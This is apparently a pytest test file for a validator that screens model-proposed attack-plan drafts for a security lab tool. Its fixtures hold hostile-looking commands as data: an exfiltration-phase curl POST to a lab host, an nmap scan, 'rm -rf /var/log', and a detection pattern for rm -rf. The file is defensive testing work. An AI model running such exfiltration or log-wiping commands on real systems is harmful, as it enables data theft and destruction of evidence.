"""The validator is the admission boundary: the model proposes, this decides."""

from app.agent.validation import normalize_findings, validate_draft

PHASES = ("Reconnaissance", "Execution", "Exfiltration")


def _payload(**overrides):
    payload = {
        "findings": [{"id": 1, "title": "beacon"}, {"id": 2, "title": "exfil"}],
        "steps": [
            {
                "phase": "Exfiltration",
                "step_type": "bash",
                "tool_name": "curl",
                "command": "curl -X POST https://lab.example/upload",
                "finding_ids": [2],
                "confidence": 0.7,
            },
            {
                "phase": "Reconnaissance",
                "step_type": "bash",
                "tool_name": "nmap",
                "command": "nmap -sV 10.0.0.5",
                "finding_ids": [1],
            },
        ],
    }
    payload.update(overrides)
    return payload


def test_valid_draft_is_sorted_and_importable():
    draft = validate_draft(_payload(), phase_names=PHASES)
    assert draft["status"] == "needs_review"
    assert draft["validation"]["errors"] == []
    assert [s["phase"] for s in draft["steps"]] == ["Reconnaissance", "Exfiltration"]
    assert [s["order"] for s in draft["steps"]] == [1, 2]
    assert draft["steps"][0]["client_id"] == "draft-1"
    assert draft["steps"][0]["dangerous"] is False


def test_unknown_phase_and_step_type_are_errors():
    draft = validate_draft(
        _payload(
            steps=[
                {
                    "phase": "Not A Phase",
                    "step_type": "bash",
                    "command": "id",
                    "finding_ids": [1],
                },
                {"phase": "Execution", "step_type": "root", "command": "id"},
            ]
        ),
        phase_names=PHASES,
    )
    assert draft["status"] == "invalid"
    assert any("unknown phase" in e for e in draft["validation"]["errors"])
    assert any("unsupported step_type" in e for e in draft["validation"]["errors"])
    assert draft["steps"] == []


def test_empty_and_oversized_commands_rejected():
    draft = validate_draft(
        _payload(
            steps=[
                {"phase": "Execution", "step_type": "bash", "command": "   "},
                {
                    "phase": "Execution",
                    "step_type": "bash",
                    "command": "x" * 5000,
                },
                "not-a-step",
            ]
        ),
        phase_names=PHASES,
    )
    errors = draft["validation"]["errors"]
    assert any("empty command" in e for e in errors)
    assert any("longer than" in e for e in errors)
    assert any("not an object" in e for e in errors)


def test_no_steps_is_an_error():
    draft = validate_draft(_payload(steps=[]), phase_names=PHASES)
    assert draft["status"] == "invalid"
    assert "draft has no steps" in draft["validation"]["errors"]


def test_unknown_finding_ids_filtered_with_warning():
    draft = validate_draft(
        _payload(
            steps=[
                {
                    "phase": "Execution",
                    "step_type": "bash",
                    "command": "id",
                    "finding_ids": [99, "bad"],
                }
            ]
        ),
        phase_names=PHASES,
    )
    assert draft["steps"][0]["finding_ids"] == []
    assert any(
        "no valid evidence reference" in w for w in draft["validation"]["warnings"]
    )


def test_dangerous_command_is_flagged_not_dropped():
    draft = validate_draft(
        _payload(
            steps=[
                {
                    "phase": "Execution",
                    "step_type": "bash",
                    "command": "rm -rf /var/log",
                    "finding_ids": [1],
                }
            ]
        ),
        phase_names=PHASES,
        risky_patterns=[r"rm\s+-rf"],
    )
    assert draft["steps"][0]["dangerous"] is True
    assert draft["validation"]["dangerous_steps"] == [1]
    assert any("flagged dangerous" in w for w in draft["validation"]["warnings"])


def test_duplicate_commands_warned():
    step = {
        "phase": "Execution",
        "step_type": "bash",
        "command": "id",
        "finding_ids": [1],
    }
    draft = validate_draft(_payload(steps=[step, dict(step)]), phase_names=PHASES)
    assert any("duplicate command" in w for w in draft["validation"]["warnings"])


def test_placeholder_in_command_warns_not_errors():
    draft = validate_draft(
        _payload(
            steps=[
                {
                    "phase": "Execution",
                    "step_type": "bash",
                    "command": "nmap -sV <IP>",
                    "finding_ids": [1],
                },
                {
                    "phase": "Reconnaissance",
                    "step_type": "bash",
                    "command": "curl https://lab.example/TODO",
                    "finding_ids": [1],
                },
            ]
        ),
        phase_names=PHASES,
    )
    warnings = draft["validation"]["warnings"]
    assert draft["validation"]["errors"] == []
    assert any("placeholder <IP>" in w for w in warnings)
    assert any("placeholder TODO" in w for w in warnings)


def test_findings_not_a_list():
    draft = validate_draft({"findings": "nope", "steps": []}, phase_names=PHASES)
    assert "findings must be a list" in draft["validation"]["errors"]


def test_normalize_findings_filters_and_flags():
    findings, warnings = normalize_findings(
        {
            "findings": [
                {"title": "ok", "stage": "Execution", "confidence": 5},
                {"title": "", "stage": "Execution"},
                "not-a-finding",
                {"title": "weird stage", "stage": "Nope", "evidence": [{"quote": "q"}]},
                {"title": "no evidence", "stage": None},
            ]
        },
        phase_names=PHASES,
    )
    assert [f["title"] for f in findings] == ["ok", "weird stage", "no evidence"]
    assert findings[0]["confidence"] == 1.0  # clamped
    assert findings[1]["stage"] is None
    assert findings[1]["evidence"] == [{"quote": "q"}]
    assert any("no title" in w for w in warnings)
    assert any("not an object" in w for w in warnings)
    assert any("unknown stage" in w for w in warnings)


def test_normalize_findings_without_list():
    findings, warnings = normalize_findings({}, phase_names=PHASES)
    assert findings == []
    assert warnings == ["model returned no findings list"]
